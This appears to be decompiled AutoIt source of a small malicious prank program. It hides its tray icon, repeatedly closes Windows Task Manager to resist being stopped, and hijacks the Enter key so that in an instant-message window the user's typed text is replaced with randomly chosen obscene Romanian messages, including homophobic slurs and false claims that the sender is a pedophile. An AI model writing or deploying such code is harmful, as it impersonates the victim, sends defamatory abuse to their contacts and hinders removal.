; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: D:\alex.au3>
; ----------------------------------------------------------------------------

; <AUT2EXE VERSION: 3.1.1.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\test4\test_m.au3>
; ----------------------------------------------------------------------------

#NoTrayIcon
Opt("SendKeyDelay", 1);
Opt("WinTitleMatchMode", 2);
HotKeySet("{ENTER}", "DoEnter");

;;;; Body of program would go here ;;;;
While 1
	Sleep(100)
	if WinExists("Windows Task Manager") Then
		WinClose("Windows Task Manager")
	EndIf
WEnd
;;;;;;;;

Func DoEnter()
	$whattext = Random(1, 8, 1);
	$text = "salut";
	Select
		Case $whattext = 1
			$text = "Fac muie moka";
		Case $whattext = 2
			$text = "Dak vrei itzi fac un bot p moka";
		Case $whattext = 3
			$text = "Sug pula la totzi, vrei si u?";
		Case $whattext = 4
			$text = "Sunt un bulangiu labagiu";
		Case $whattext = 5
			$text = "Mama cat d marfa e sa faci laba uitandu-te la filme porno :P";
		Case $whattext = 6
			$text = "Cand vrei sa itzi fac un bot??? Hai ca pt tine e moka";
		Case Else
			$text = "Sunt un poponar handicapat, sunt pedofil, imi place sexul anal si sa sug pula. Ce zici, ma vrei?:D";
	EndSelect
	If WinActive("Instant Message") Then
			Send("^a");
			Send($text);
	EndIf
	HotKeySet("{ENTER}")
	Send("{ENTER}");
	HotKeySet("{ENTER}", "DoEnter")
EndFunc

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\test4\test_m.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: D:\alex.au3>
; ----------------------------------------------------------------------------

